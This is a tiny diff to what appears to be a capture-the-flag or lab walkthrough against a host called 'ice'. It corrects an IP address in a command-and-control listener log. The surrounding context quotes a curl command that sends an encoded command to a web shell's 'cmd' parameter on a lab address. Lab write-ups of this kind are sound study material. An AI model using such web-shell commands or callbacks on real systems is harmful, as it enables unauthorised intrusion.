@@ -492,7 +492,7 @@ curl "http://192.168.56.137:9999/?cmd=$encoded_cmd";
 
 ```
 [13:40:40] received connection from 192.168.56.137:58474 ←
-[13:40:41] 192.168.56.135:58474: registered new host w/ db
+[13:40:41] 192.168.56.137:58474: registered new host w/ db
 ```
 
 ![Victim: ice](https://img.shields.io/badge/Victim-ice-64b5f6?logo=linux&logoColor=white)
